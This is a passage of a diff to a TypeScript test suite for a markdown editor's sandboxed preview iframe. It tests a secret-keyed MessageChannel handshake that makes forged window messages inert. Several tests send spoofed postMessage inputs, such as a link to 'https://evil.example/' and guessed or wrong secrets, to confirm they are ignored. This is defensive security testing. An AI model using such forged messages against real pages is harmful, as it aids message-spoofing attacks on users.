@@ -25,7 +25,7 @@ import v8 from 'node:v8';
 import type { AddressInfo } from 'node:net';
 import {
   createEditorShell, textareaAdapter, codemirror6Adapter, createTextModel, toEditorText, minimalChange, createPreview, previewFrameDocument,
-  lineToTop, topToLine, renderMarkdownPreview, isCodeMirror6Modules, PREVIEW_SANDBOX, PREVIEW_BRIDGE, CODEMIRROR6_URL, CODEMIRROR6_VERSIONS,
+  lineToTop, topToLine, renderMarkdownPreview, isCodeMirror6Modules, PREVIEW_SANDBOX, PREVIEW_BRIDGE, PREVIEW_SECRET_ATTRIBUTE, previewFrameParts, CODEMIRROR6_URL, CODEMIRROR6_VERSIONS,
   CODEMIRROR6_INTEGRITY, CODEMIRROR6_BYTES, CODEMIRROR6_PATH, CODEMIRROR6_GLOBAL, EDITOR_CSS, PREVIEW_BRIDGE_HASH, previewScriptHashes,
   previewSandbox, rewriteAssetUrls, mapSrcset, renderMarkdownPreviewWithIncludes, undoSteps, detachString, loadCodeMirror6, CODEMIRROR6_HISTORY_STEPS,
   type EditorShell, type EditorShellOptions, type EdElement, type EdDocument, type EdFile, type RenderContext,
@@ -378,7 +378,9 @@ function fakePreviewPage() {
   const iframe: Record<string, unknown> = {
     attrs: {} as Record<string, string>,
     setAttribute(n: string, v: string) { (this.attrs as Record<string, string>)[n] = v; },
-    addEventListener() {}, removeEventListener() {},
+    on: {} as Record<string, (e: unknown) => void>,
+    addEventListener(t: string, l: (e: unknown) => void) { (this.on as Record<string, unknown>)[t] = l; },
+    removeEventListener(t: string) { delete (this.on as Record<string, unknown>)[t]; },
     remove() { this.removed = true; },
     contentWindow: frameWindow,
   };
@@ -415,7 +417,7 @@ describe('the preview', () => {
     expect(f.listeners.size).toBe(0);
   });
 
-  it('[E.5] messages are read only from that iframe\'s window: anchors, scroll, keys and links forged by another window are ignored; payloads are validated as data', () => {
+  it('[E.5] messages are read only from that iframe\'s window: anchors, scroll, keys and links forged by another window are ignored; payloads are validated as data; keys, links and scrolls on the window never act, even from the frame', () => {
     const f = fakePreviewPage();
     const seen: unknown[] = [];
     const p = createPreview(f.doc, f.parent, { assets: false }, {
@@ -436,7 +438,7 @@ describe('the preview', () => {
     f.emit({ type: 'orz-preview-link', href: 42 }, f.frameWindow);
     f.emit({ type: 'orz-preview-scrolled', top: 120, max: 1000 }, f.frameWindow);
     expect(p.anchors).toEqual([[2, 50], [9, 400]]);
-    expect(seen).toEqual([['rendered', [[2, 50], [9, 400]]], ['key', 'Escape'], ['scrolled', 120]]);
+    expect(seen).toEqual([['rendered', [[2, 50], [9, 400]]]]);
     p.destroy();
   });
 
@@ -568,7 +570,7 @@ describe('instances', () => {
     const engine = textareaAdapter();
     const destroyEngine = vi.spyOn(engine, 'destroy');
     const m = mount({ render, adapter: engine }, ctx);
-    expect(added.sort()).toEqual(['blur', 'message', 'resize']);
+    expect(added.sort()).toEqual(['message', 'resize']);
     await tick(30);
     const calls = render.mock.calls.length;
     type(m, 'pending');
@@ -906,8 +908,30 @@ function frameOf(m: Mounted) {
   const say = (data: unknown) => { m.win.dispatchEvent(new m.win.MessageEvent('message', { data, source: cw as never }) as unknown as Event); };
   return { iframe, posted, say };
 }
-/** `navigator.userActivation.isActive` as the browser would report it. */
+/** `navigator.userActivation.isActive` as the browser would report it (the shell no longer reads it: window messages never act). */
 const activation = (m: Mounted, isActive: boolean) => Object.defineProperty(m.win.navigator, 'userActivation', { value: { isActive }, configurable: true });
+/** The secret the shell wrote on the bridge's `<script>` in the frame document. */
+const secretOf = (iframe: { srcdoc: string }): string => /data-orz-preview-secret="([^"]*)"/.exec(String(iframe.srcdoc))?.[1] ?? '';
+/**
+ * The shell's preview frame with the default bridge's authenticated handshake done: a fake
+ * MessageChannel on the page, a ready carrying the frame's secret; `bridge(msg)` is a report through
+ * the port (the reader's own trusted event in the frame), `sent` what the shell posts through it.
+ */
+function authFrameOf(m: Mounted) {
+  const f = frameOf(m);
+  const sent: Array<Record<string, unknown>> = [];
+  let shellSide: { onmessage: ((e: { data: unknown }) => void) | null; closed: boolean } | null = null;
+  (m.win as unknown as Record<string, unknown>).MessageChannel = class {
+    port1 = { onmessage: null, closed: false, postMessage(x: Record<string, unknown>) { sent.push(x); }, close() { this.closed = true; } };
+    port2 = {};
+    constructor() { shellSide = this.port1; }
+  };
+  f.say({ type: 'orz-preview-ready', channel: 'chan-1', secret: secretOf(f.iframe) });
+  if (!shellSide) throw new Error('the shell handed no port for the right secret');
+  const port = shellSide as { onmessage: ((e: { data: unknown }) => void) | null; closed: boolean };
+  const bridge = (data: unknown) => port.onmessage?.({ data });
+  return { ...f, sent, bridge, port };
+}
 
 describe('the exact text across undo (A-3, A-4)', () => {
   it('[E.1] each remembered text keeps its own BOM and line endings: a BOM + CR LF document, setText of an LF text, undo, then typing writes BOM + CR LF again; selection offsets in a remembered mixed-EOL text are mapped on that exact string', () => {
@@ -946,51 +970,57 @@ describe('events (B-13)', () => {
 });
 
 describe('frame messages (A-2, E06)', () => {
-  it('[E.14] a forged Escape moves focus only while the preview frame has it; a save key, the view key or a link from the frame needs focus on the frame AND transient user activation; nothing happens while the reader is in the editor', async () => {
+  it('[E.14] window messages never act: a save key, the view key, Escape or a link posted on the window does nothing — with the reader in the editor, with the focus on the preview frame and with user activation alike, and for a bridge without the port; the same reports through the authenticated port act', async () => {
     const save = vi.fn(async () => undefined);
     const links: string[] = [];
     const m = mount({ hooks: { save }, onLink: (h) => links.push(h) });
-    const f = frameOf(m);
-    f.say({ type: 'orz-preview-ready' });
+    const f = authFrameOf(m);
     const ta = m.ta();
+    const forge = () => {
+      for (const key of ['Escape', 's', '\\']) f.say({ type: 'orz-preview-key', key });
+      f.say({ type: 'orz-preview-link', href: 'https://evil.example/' });
+    };
     ta.focus();
-    activation(m, true); // the reader is typing: the page has activation
-    for (const key of ['Escape', 's', '\\']) f.say({ type: 'orz-preview-key', key });
-    f.say({ type: 'orz-preview-link', href: 'https://evil.example/' });
+    activation(m, true);
+    forge();
     await tick();
-    expect(m.root.activeElement).toBe(ta);
-    expect(save).not.toHaveBeenCalled();
-    expect(m.shell.getMode()).toBe('split');
-    expect(links).toEqual([]);
-    // focus on the frame but no activation (e.g. focused by a script): still nothing
-    f.iframe.focus();
-    activation(m, false);
-    f.say({ type: 'orz-preview-key', key: 's' });
-    f.say({ type: 'orz-preview-link', href: 'https://evil.example/' });
-    await tick();
-    expect(save).not.toHaveBeenCalled();
-    expect(links).toEqual([]);
-    // Escape with focus on the frame: focus goes to the toolbar (all it can do)
-    f.say({ type: 'orz-preview-key', key: 'Escape' });
-    expect(m.root.activeElement?.getAttribute('data-mode')).toBe('split');
-    // the reader in the frame (focus + activation): save and link act
+    expect([m.root.activeElement === ta, save.mock.calls.length, m.shell.getMode(), links]).toEqual([true, 0, 'split', []]);
+    // the focus on the frame (the reader's click, or a document script's focus()) and fresh activation: still nothing
     f.iframe.focus();
     activation(m, true);
-    f.say({ type: 'orz-preview-key', key: 's' });
-    f.say({ type: 'orz-preview-link', href: 'https://example.org/' });
+    forge();
     await tick();
-    expect(save).toHaveBeenCalledTimes(1);
-    expect(links).toEqual(['https://example.org/']);
+    expect([m.root.activeElement === f.iframe, save.mock.calls.length, m.shell.getMode(), links]).toEqual([true, 0, 'split', []]);
+    // through the port: the reader's own keys and click in the frame
+    f.bridge({ type: 'orz-preview-key', key: 's' });
+    f.bridge({ type: 'orz-preview-link', href: 'https://example.org/' });
+    await tick();
+    expect([save.mock.calls.length, links]).toEqual([1, ['https://example.org/']]);
+    f.bridge({ type: 'orz-preview-key', key: '\\' });
+    expect(m.shell.getMode()).toBe('editor');
+    f.bridge({ type: 'orz-preview-key', key: 'Escape' });
+    expect(m.root.activeElement?.getAttribute('data-mode')).toBe('editor');
     m.shell.destroy();
+    // a bridge without the port (a plain ready): renders only — its keys and links never act
+    const n = mount({ hooks: { save }, onLink: (h) => links.push(h) });
+    const g = frameOf(n);
+    g.say({ type: 'orz-preview-ready' });
+    g.iframe.focus();
+    activation(n, true);
+    for (const key of ['Escape', 's', '\\']) g.say({ type: 'orz-preview-key', key });
+    g.say({ type: 'orz-preview-link', href: 'https://evil.example/' });
+    await tick(30);
+    expect([n.root.activeElement === g.iframe, save.mock.calls.length, n.shell.getMode(), links.length]).toEqual([true, 1, 'split', 1]);
+    expect(g.posted.some((x) => x.type === 'orz-preview-render')).toBe(true);
+    n.shell.destroy();
   });
 
-  it('[E.14] the frame\'s "active" and scroll messages never move an editor that has focus or that the reader just touched; the preview leads only after its own claim, with the editor untouched', async () => {
+  it('[E.14] the frame\'s "active" and scroll reports never move an editor that has focus or that the reader just touched; the preview leads only after its own report, with the editor untouched; the same messages on the window never move it', async () => {
     const engine = textareaAdapter();
     const scrollTo = vi.spyOn(engine, 'scrollTo');
     const m = mount({ adapter: engine });
-    const f = frameOf(m);
-    f.say({ type: 'orz-preview-ready' });
-    const flood = () => { f.say({ type: 'orz-preview-active' }); f.say({ type: 'orz-preview-scrolled', top: 0, max: 1000 }); };
+    const f = authFrameOf(m);
+    const flood = () => { f.bridge({ type: 'orz-preview-active' }); f.bridge({ type: 'orz-preview-scrolled', top: 0, max: 1000 }); };
     m.ta().focus();
     await tick(350);
     flood();
@@ -999,9 +1029,12 @@ describe('frame messages (A-2, E06)', () => {
     m.ta().dispatchEvent(new m.win.PointerEvent('pointermove', { bubbles: true }) as unknown as Event);
     flood();
     expect(scrollTo).not.toHaveBeenCalled(); // the reader's pointer is on the editor
-    await tick(1600); // the frame's earlier claims have expired
-    f.say({ type: 'orz-preview-scrolled', top: 500, max: 1000 });
-    expect(scrollTo).not.toHaveBeenCalled(); // no fresh claim of the frame
+    await tick(1600); // the frame's earlier reports have expired
+    f.bridge({ type: 'orz-preview-scrolled', top: 500, max: 1000 });
+    expect(scrollTo).not.toHaveBeenCalled(); // no fresh report of the reader in the frame
+    f.say({ type: 'orz-preview-active' });
+    f.say({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
+    expect(scrollTo).not.toHaveBeenCalled(); // window messages: data, never a scroll
     flood();
     expect(scrollTo).toHaveBeenCalledWith({ fraction: 0 }); // the reader is in the preview (as far as the page can tell)
     m.shell.destroy();
@@ -1059,15 +1092,16 @@ describe('preview rendering (B-5, B-9, B-11, item 11)', () => {
     const engine = textareaAdapter();
     const scrollTo = vi.spyOn(engine, 'scrollTo');
     const nav = mount({ text: 'a\nb\nc\nd\ne\n', adapter: engine, preview: { assets: false, debounceMs: 5, mode: 'navigate' } });
-    const fn = frameOf(nav);
-    fn.say({ type: 'orz-preview-ready' });
+    const fn = authFrameOf(nav);
     nav.ta().focus();
     nav.ta().setSelectionRange(6, 6); // line 3
     nav.ta().dispatchEvent(new nav.win.Event('select') as unknown as Event);
     await tick(40);
-    expect(fn.posted.filter((x) => x.type === 'orz-preview-navigate').at(-1)).toEqual({ type: 'orz-preview-navigate', line: 3 });
+    expect(fn.sent.filter((x) => x.type === 'orz-preview-navigate').at(-1)).toEqual({ type: 'orz-preview-navigate', line: 3 });
     fn.iframe.focus();
-    fn.say({ type: 'orz-preview-scrolled', line: 4 });
+    fn.say({ type: 'orz-preview-scrolled', line: 2 }); // on the window: data, no scroll
+    expect(scrollTo).not.toHaveBeenCalledWith({ line: 2 });
+    fn.bridge({ type: 'orz-preview-scrolled', line: 4 }); // __orzPreview.navigated(4), through the port
     expect(scrollTo).toHaveBeenLastCalledWith({ line: 4 });
     nav.shell.destroy();
     // mapLine / mapPosition replace the anchor maths
@@ -1075,13 +1109,12 @@ describe('preview rendering (B-5, B-9, B-11, item 11)', () => {
     vi.spyOn(mapped, 'getScroll').mockReturnValue({ line: 4, fraction: 0.5 });
     const toLine = vi.spyOn(mapped, 'scrollTo');
     const mp = mount({ adapter: mapped, preview: { assets: false, debounceMs: 5, mapLine: (l) => l * 10, mapPosition: (t) => t / 10 } });
-    const fm = frameOf(mp);
-    fm.say({ type: 'orz-preview-ready' });
+    const fm = authFrameOf(mp);
     mp.ta().dispatchEvent(new mp.win.Event('scroll') as unknown as Event);
     await tick(40);
-    expect(fm.posted.filter((x) => x.type === 'orz-preview-scroll').at(-1)).toEqual({ type: 'orz-preview-scroll', top: 40 });
+    expect(fm.sent.filter((x) => x.type === 'orz-preview-scroll').at(-1)).toEqual({ type: 'orz-preview-scroll', top: 40 });
     fm.iframe.focus();
-    fm.say({ type: 'orz-preview-scrolled', top: 70, max: 1000 });
+    fm.bridge({ type: 'orz-preview-scrolled', top: 70, max: 1000 });
     expect(toLine).toHaveBeenLastCalledWith({ line: 7 });
     mp.shell.destroy();
   });
@@ -1123,7 +1156,7 @@ describe('preview rendering (B-5, B-9, B-11, item 11)', () => {
     }
     const src = readFileSync('src/carrier/editor/preview.ts', 'utf8');
     expect(src.match(/setAttribute\('sandbox'/g)).toHaveLength(1);
-    expect(src).toMatch(/\bf\.setAttribute\('sandbox', previewSandbox\(/); // in makeFrame, the one place every preview iframe is made
+    expect(src).toMatch(/\biframe\.setAttribute\('sandbox', previewSandbox\(/); // in createPreview, the one place the preview iframe is made
     for (const f of ['adapter', 'codemirror6', 'index', 'preview', 'render-md', 'shell', 'styles', 'text-model', 'types']) {
       const code = readFileSync(`src/carrier/editor/${f}.ts`, 'utf8').replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, ''); // code, not comments
       if (f === 'preview') expect(code.match(/allow-same-origin/g), f).toHaveLength(1); // previewSandbox's file: case only
@@ -1228,16 +1261,13 @@ describe('FC-19 §3 hooks (B-10)', () => {
       hooks: { fetchInclude, resolveAsset: (p) => `https://cdn.app/${p}`, resolveLink: (h) => `https://app.example/open?d=${encodeURIComponent(h)}` },
       onLink: (h) => links.push(h),
     });
-    const f = frameOf(m);
-    f.say({ type: 'orz-preview-ready' });
+    const f = authFrameOf(m);
     await tick(40);
     expect(await ctxs[0].fetchInclude!('a.md')).toBe('included a.md');
     expect(ctxs[0].resolveAsset!('x.png')).toBe('https://cdn.app/x.png');
-    const html = String(f.posted.filter((x) => x.type === 'orz-preview-render').at(-1)!.html);
+    const html = String(f.sent.filter((x) => x.type === 'orz-preview-render').at(-1)!.html);
     expect(html).toContain('src="https://cdn.app/img/p.png"');
-    f.iframe.focus();
-    activation(m, true);
-    f.say({ type: 'orz-preview-link', href: 'week2.md' });
+    f.bridge({ type: 'orz-preview-link', href: 'week2.md' });
     expect(links).toEqual(['https://app.example/open?d=week2.md']);
     m.shell.destroy();
   });
@@ -1851,214 +1881,202 @@ describe('preview pacing, navigation, channel (round 2: B#3, LOW6, B#4, B#8)', (
     expect(bridgeAt).toBeGreaterThan(0);
     expect(bridgeAt).toBeLessThan(full.indexOf('<link'));
     expect(bridgeAt).toBeLessThan(full.indexOf('id="orz-doc"'));
-    for (const hook of ['__orzPreviewApply', '__orzPreviewNavigate', '__orzPreviewMessage', '__orzPreview={report:report']) expect(PREVIEW_BRIDGE).toContain(hook);
+    for (const hook of ['__orzPreviewApply', '__orzPreviewNavigate', '__orzPreviewMessage', '__orzPreview={report:report,post:post,navigated:navigated}']) expect(PREVIEW_BRIDGE).toContain(hook);
     const custom = previewFrameDocument({ assets: false, bridge: 'void 0', head: '<link rel="stylesheet" href="t.css">' });
     expect(custom.indexOf('<script>void 0</script>')).toBeGreaterThan(custom.indexOf('id="orz-doc"'));
-    // paused scripts: the CSP meta comes first in <head>, then the bridge, all scripts nonce-stamped
-    const paused = previewFrameDocument({ pauseScripts: 'n0nce', head: '<link rel="stylesheet" href="t.css">' });
-    expect(paused).toMatch(/<head><meta charset="utf-8"><meta name="viewport"[^>]*><meta http-equiv="Content-Security-Policy" content="script-src 'nonce-n0nce' 'strict-dynamic'"><script nonce="n0nce">/);
-    for (const t of paused.match(/<(script|link)\b[^>]*>/g)!) expect(t).toContain('nonce="n0nce"');
+    // the frame's secret rides on the bridge's own <script> (its text, and so its hash, stays the same), first in <head>, nonce-stamped
+    const signed = previewFrameDocument({ secret: 's3"cret', nonce: 'n0nce', head: '<link rel="stylesheet" href="t.css">' });
+    expect(signed).toContain(`<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><script nonce="n0nce" ${PREVIEW_SECRET_ATTRIBUTE}="s3&quot;cret">${PREVIEW_BRIDGE}</script>`);
+    for (const t of signed.match(/<(script|link)\b[^>]*>/g)!) expect(t).toContain('nonce="n0nce"');
+    // a carrier's own bridge gets it too (frameDocument places parts.bridge), so it can do the same handshake
+    expect(previewFrameParts({ bridge: 'void 0', secret: 'k' }).bridge).toBe(`<script ${PREVIEW_SECRET_ATTRIBUTE}="k">void 0</script>`);
+    expect(previewFrameParts({}).bridge).toBe(`<script>${PREVIEW_BRIDGE}</script>`);
+  });
+
+  it('[E.25] __orzPreviewApply calls never overlap: a render that arrives while the last one\'s promise is pending waits, only the latest runs after it, and each is acknowledged when it settles', async () => {
+    // the bridge, run in a bare vm context: enough DOM for the page hook path
+    const posted: Array<Record<string, unknown>> = [];
+    const listeners: Record<string, Array<(e: unknown) => void>> = {};
+    const applied: string[] = [];
+    const settle: Array<() => void> = [];
+    const win: Record<string, unknown> = {
+      addEventListener: (t: string, l: (e: unknown) => void) => { (listeners[t] ??= []).push(l); },
+      setTimeout, clearTimeout, Reflect, Uint32Array, Array, Math, Date, String, isFinite, isNaN, parseInt,
+      __orzPreviewApply: (html: string) => { applied.push(html); return new Promise<void>((r) => settle.push(r)); },
+    };
+    win.window = win;
+    win.parent = { postMessage: (m: Record<string, unknown>) => posted.push(m) };
+    win.document = {
+      currentScript: null, documentElement: { getAttribute: () => null }, scrollingElement: { scrollTop: 0, scrollHeight: 0 },
+      addEventListener: () => {}, getElementById: () => null,
+    };
+    win.requestAnimationFrame = (f: () => void) => setTimeout(f, 0);
+    vm.runInNewContext(PREVIEW_BRIDGE, win);
+    expect(posted[0]).toEqual({ type: 'orz-preview-ready' }); // no secret on its script: a plain ready
+    const fromShell = (d: unknown) => { for (const l of listeners.message ?? []) l({ data: d, source: win.parent, stopImmediatePropagation() {} }); };
+    fromShell({ type: 'orz-preview-render', id: 1, html: 'one' });
+    fromShell({ type: 'orz-preview-render', id: 2, html: 'two' });
+    fromShell({ type: 'orz-preview-render', id: 3, html: 'three' });
+    expect(applied).toEqual(['one']);
+    settle[0]();
+    await tick(5);
+    expect(applied).toEqual(['one', 'three']);
+    expect(posted.filter((m) => m.type === 'orz-preview-rendered')).toEqual([]);
+    settle[1]();
+    await tick(5);
+    expect(posted.filter((m) => m.type === 'orz-preview-rendered').map((m) => m.id)).toEqual([3]);
   });
 });
 
-describe('the preview channel and the frame\'s claims (round 2: F1, B#10)', () => {
-  /** A fake window with MessageChannel: the transferred port and what goes through it. */
+describe('the authenticated preview channel (option B: the frame secret)', () => {
+  /** A fake window with MessageChannel: every port the shell makes, and what goes through it. */
   function portPage() {
     const f = fakePreviewPage();
-    const toFrame: unknown[] = [];
-    let frameSide: { onmessage: ((e: { data: unknown }) => void) | null } | null = null;
-    const shellSide = { onmessage: null as ((e: { data: unknown }) => void) | null, postMessage: (m: unknown) => { toFrame.push(m); }, close() {} };
-    (f.doc.defaultView as unknown as Record<string, unknown>).MessageChannel = class { port1 = shellSide; port2 = { onmessage: null }; constructor() { frameSide = this.port2 as never; } };
+    type FakePort = { onmessage: ((e: { data: unknown }) => void) | null; sent: unknown[]; closed: boolean; postMessage(m: unknown): void; close(): void };
+    const ports: FakePort[] = [];
+    (f.doc.defaultView as unknown as Record<string, unknown>).MessageChannel = class {
+      port1: FakePort;
+      port2 = { onmessage: null };
+      constructor() {
+        this.port1 = { onmessage: null, sent: [], closed: false, postMessage(m: unknown) { this.sent.push(m); }, close() { this.closed = true; } };
+        ports.push(this.port1);
+      }
+    };
     const transfers: unknown[] = [];
     f.frameWindow.postMessage = (m: unknown, _o?: unknown, t?: unknown[]) => { f.posted.push(m); if (t) transfers.push(...t); };
-    const fromBridge = (data: unknown) => shellSide.onmessage?.({ data });
-    return { ...f, toFrame, transfers, fromBridge, frameSide: () => frameSide };
+    const fromBridge = (data: unknown, i = ports.length - 1) => ports[i].onmessage?.({ data });
+    const load = () => (f.iframe.on as Record<string, (e: unknown) => void>).load?.({});
+    return { ...f, ports, transfers, fromBridge, load };
   }
 
-  it('[E.5] a ready that carries a channel gets a private MessageChannel port; the shell then talks through it, and the bridge\'s reports count only through it — the same message types posted on the window are ignored', () => {
+  it('[E.5] [E.14] the port goes only to a ready with this frame\'s secret: a forged ready — without a channel, with a channel and no or a wrong secret, or a second one before the frame loads again — is ignored and the real port stays open; a reload of the document (its load event) may take a new port, retiring the old one; a new frame document (setOptions) has a new secret', () => {
     const f = portPage();
     const seen: unknown[] = [];
+    let readies = 0;
     const p = createPreview(f.doc, f.parent, { assets: false }, {
-      onKey: (k, trusted) => seen.push(['key', k, trusted]), onLink: (h, trusted) => seen.push(['link', h, trusted]), onActive: (i, trusted) => seen.push(['active', i, trusted]),
-      onFocus: (reader) => seen.push(['focus', reader]),
+      onKey: (k) => seen.push(['key', k]), onLink: (h) => seen.push(['link', h]), onActive: (i) => seen.push(['active', i]), onScrolled: (t) => seen.push(['scrolled', t]), onReady: () => readies++,
     });
+    const secret = secretOf(f.iframe as { srcdoc: string });
+    expect(secret).toMatch(/^[0-9a-z]+(-[0-9a-z]+){3}$/);
+    expect(String(f.iframe.srcdoc)).toContain(`<script ${PREVIEW_SECRET_ATTRIBUTE}="${secret}">${PREVIEW_BRIDGE}</script>`);
+    // the bridge reads it from its own <script> and removes it first thing, then says ready with it
+    expect(PREVIEW_BRIDGE.indexOf('sec=me.getAttribute("data-orz-preview-secret");me.removeAttribute("data-orz-preview-secret")')).toBeLessThan(PREVIEW_BRIDGE.indexOf('window.addEventListener'));
+    expect(PREVIEW_BRIDGE).toContain('post(sec?{type:"orz-preview-ready",channel:chan,secret:sec}:{type:"orz-preview-ready"});sec=null;');
+    expect(PREVIEW_SECRET_ATTRIBUTE).toBe('data-orz-preview-secret');
     p.render('<p>one</p>');
-    f.emit({ type: 'orz-preview-ready', channel: 'tok' }, f.frameWindow);
+    for (const forged of [{ channel: 'tok' }, { channel: 'tok', secret: 'guess' }, { channel: '', secret }, { channel: 'tok', secret: secret.toUpperCase() }]) f.emit({ type: 'orz-preview-ready', ...forged }, f.frameWindow);
+    f.emit({ type: 'orz-preview-ready', channel: 'tok', secret }, { postMessage() {} }); // the right secret from another window
+    expect([f.posted, f.transfers.length, p.ready, readies]).toEqual([[], 0, false, 0]);
+    f.emit({ type: 'orz-preview-ready', channel: 'tok', secret }, f.frameWindow);
     expect(f.posted).toEqual([{ type: 'orz-preview-port', channel: 'tok' }]);
-    expect(f.transfers).toHaveLength(1);
-    expect(f.toFrame).toEqual([{ type: 'orz-preview-render', id: 1, html: '<p>one</p>' }]);
-    expect(p.authenticated).toBe(true);
-    // forged on the window: ignored
+    expect([f.transfers.length, f.ports.length, p.authenticated, p.ready, readies]).toEqual([1, 1, true, true, 1]);
+    expect(f.ports[0].sent).toEqual([{ type: 'orz-preview-render', id: 1, html: '<p>one</p>' }]);
+    // a replaced document's readies (document.open, a navigation, a meta refresh) and a second one of the same document: ignored
+    f.emit({ type: 'orz-preview-ready' }, f.frameWindow);
+    f.emit({ type: 'orz-preview-ready', channel: 'x' }, f.frameWindow);
+    f.emit({ type: 'orz-preview-ready', channel: 'x', secret: 'nope' }, f.frameWindow);
+    f.emit({ type: 'orz-preview-ready', channel: 'x', secret }, f.frameWindow);
+    expect([f.posted.length, f.ports.length, f.ports[0].closed, f.ports[0].onmessage !== null, f.ports[0].sent.length, readies]).toEqual([1, 1, false, true, 1, 1]);
+    // window messages of the bridge's types never act
     f.emit({ type: 'orz-preview-key', key: 's' }, f.frameWindow);
     f.emit({ type: 'orz-preview-link', href: 'https://evil.example/' }, f.frameWindow);
     f.emit({ type: 'orz-preview-active', input: 'pointer' }, f.frameWindow);
-    f.emit({ type: 'orz-preview-focus', reader: true }, f.frameWindow);
+    f.emit({ type: 'orz-preview-scrolled', top: 9, max: 10 }, f.frameWindow);
     expect(seen).toEqual([]);
-    // the bridge's own reports through the port
+    // the bridge's own reports through the port act
     f.fromBridge({ type: 'orz-preview-key', key: 's' });
     f.fromBridge({ type: 'orz-preview-link', href: 'https://example.org/' });
     f.fromBridge({ type: 'orz-preview-active', input: 'pointer' });
-    f.fromBridge({ type: 'orz-preview-focus', reader: false });
-    expect(seen).toEqual([['key', 's', true], ['link', 'https://example.org/', true], ['active', 'pointer', true], ['focus', false]]);
+    f.fromBridge({ type: 'orz-preview-scrolled', top: 40, max: 100 });
+    expect(seen).toEqual([['key', 's'], ['link', 'https://example.org/'], ['active', 'pointer'], ['scrolled', 40]]);
     p.scrollTo(40);
-    expect(f.toFrame.at(-1)).toEqual({ type: 'orz-preview-scroll', top: 40 });
+    expect(f.ports[0].sent.at(-1)).toEqual({ type: 'orz-preview-scroll', top: 40 });
+    // the same document loaded again (a moved iframe, location.reload()): its bridge, first again, may take a new port
+    f.load();
+    f.emit({ type: 'orz-preview-ready', channel: 'tok2', secret }, f.frameWindow);
+    expect([f.ports.length, f.posted.at(-1), (f.ports[1].sent[0] as Record<string, unknown>).html]).toEqual([2, { type: 'orz-preview-port', channel: 'tok2' }, '<p>one</p>']);
+    // a new frame document: a new secret; the old one gets nothing
+    p.setOptions({ scheme: 'dark' });
+    const next = secretOf(f.iframe as { srcdoc: string });
+    expect(next).not.toBe(secret);
+    f.emit({ type: 'orz-preview-ready', channel: 'tok3', secret }, f.frameWindow);
+    expect([f.ports.length, p.ready]).toEqual([2, false]);
+    f.emit({ type: 'orz-preview-ready', channel: 'tok3', secret: next }, f.frameWindow);
+    expect([f.ports.length, p.ready]).toEqual([3, true]);
     p.destroy();
-    // a carrier's own bridge (no channel): window messages, untrusted
+    expect(f.ports.every((x) => x.closed)).toBe(true);
+    expect(f.iframe.on).toEqual({});
+  });
+
+  it('[E.5] a bridge without the port (a plain ready) gets renders through the window and its render acknowledgements pace them; its keys, links, input and scrolls never act, and shell.preview.on hears only a carrier\'s own types from the window', async () => {
     const g = fakePreviewPage();
-    const seen2: unknown[] = [];
-    const q = createPreview(g.doc, g.parent, { assets: false }, { onKey: (k, trusted) => seen2.push([k, trusted]) });
+    const seen: unknown[] = [];
+    const heard: unknown[] = [];
+    const q = createPreview(g.doc, g.parent, { assets: false }, { onKey: (k) => seen.push(k), onLink: (h) => seen.push(h), onActive: (i) => seen.push(i), onScrolled: (t) => seen.push(t) });
+    q.on('orz-preview-key', (m) => heard.push(m.type));
+    q.on('x-mine', (m) => heard.push(m.type));
     g.emit({ type: 'orz-preview-ready' }, g.frameWindow);
+    const acked = q.render('<p>a</p>');
+    expect(g.posted).toEqual([{ type: 'orz-preview-render', id: 1, html: '<p>a</p>' }]);
+    g.emit({ type: 'orz-preview-rendered', id: 1, anchors: [[0, 0]], max: 5 }, g.frameWindow);
+    expect(await acked).toBe(true);
     g.emit({ type: 'orz-preview-key', key: 's' }, g.frameWindow);
-    expect([q.authenticated, seen2]).toEqual([false, [['s', false]]]);
+    g.emit({ type: 'orz-preview-link', href: 'https://evil.example/' }, g.frameWindow);
+    g.emit({ type: 'orz-preview-active', input: 'key' }, g.frameWindow);
+    g.emit({ type: 'orz-preview-scrolled', top: 3, max: 5 }, g.frameWindow);
+    g.emit({ type: 'x-mine' }, g.frameWindow);
+    expect([q.authenticated, seen, heard]).toEqual([false, [], ['x-mine']]);
     q.destroy();
   });
 
-  it('[E.5] the bridge takes the port in a capture listener registered first and hides it from the frame\'s other listeners, sends through Reflect.apply and MessagePort.prototype.postMessage as they were when it started, and reports keys, links, input and scrolls only for trusted events', () => {
+  it('[E.5] the bridge takes the port in a capture listener registered first and hides it from the frame\'s other listeners, sends through Reflect.apply and MessagePort.prototype.postMessage as they were when it started, and reports keys, links, input and scrolls only for trusted events (scrolls and navigated lines only within 1.5 s of the reader\'s own input); it has no focus report', () => {
     expect(() => new vm.Script(PREVIEW_BRIDGE)).not.toThrow(); // it parses (a syntax slip leaves the preview blank)
     expect(PREVIEW_BRIDGE.indexOf('window.addEventListener("message"')).toBeLessThan(PREVIEW_BRIDGE.indexOf('function '));
     expect(PREVIEW_BRIDGE).toContain('e.stopImmediatePropagation();if(!port&&d.channel===chan');
     expect(PREVIEW_BRIDGE).toContain('var RA=Reflect.apply,PM=typeof MessagePort==="function"?MessagePort.prototype.postMessage:null');
-    expect(PREVIEW_BRIDGE).toContain('RA(PM,port,[m])');
-    for (const guard of ['if(e.isTrusted){pointed();active("pointer")}', 'if(e.target!==window||!e.isTrusted||has)return;has=true;var r=Date.now()-lastIn<1000', 'reader:true,late:true', '{send({type:"orz-preview-pong",id:d.id,pointer:lastPtr>=bareAt})}', 'document.addEventListener("keydown",function(e){if(!e.isTrusted)return;', 'if(e.isTrusted)send({type:"orz-preview-link"', 'if(!e.isTrusted||Date.now()<mute']) expect(PREVIEW_BRIDGE).toContain(guard);
-    expect(PREVIEW_BRIDGE).toContain('window.__orzPreview={report:report,post:post}'); // post: a window message, never the port
+    expect(PREVIEW_BRIDGE).toContain('function send(m){if(port&&PM){try{RA(PM,port,[m])}catch(e){}}}'); // never the window
+    for (const guard of [
+      'if(e.isTrusted)active("pointer")', 'if(e.isTrusted&&e.buttons)lastIn=Date.now()', 'document.addEventListener("keydown",function(e){if(!e.isTrusted)return;',
+      'if(e.isTrusted)send({type:"orz-preview-link"', 'if(!e.isTrusted||Date.now()<mute||Date.now()-lastIn>1500||queued)return;', 'Date.now()-lastIn<1500)send({type:"orz-preview-scrolled",line:l})',
+    ]) expect(PREVIEW_BRIDGE).toContain(guard);
+    for (const gone of ['orz-preview-focus', 'orz-preview-ping', 'orz-preview-pong', 'hasFocus']) expect(PREVIEW_BRIDGE).not.toContain(gone);
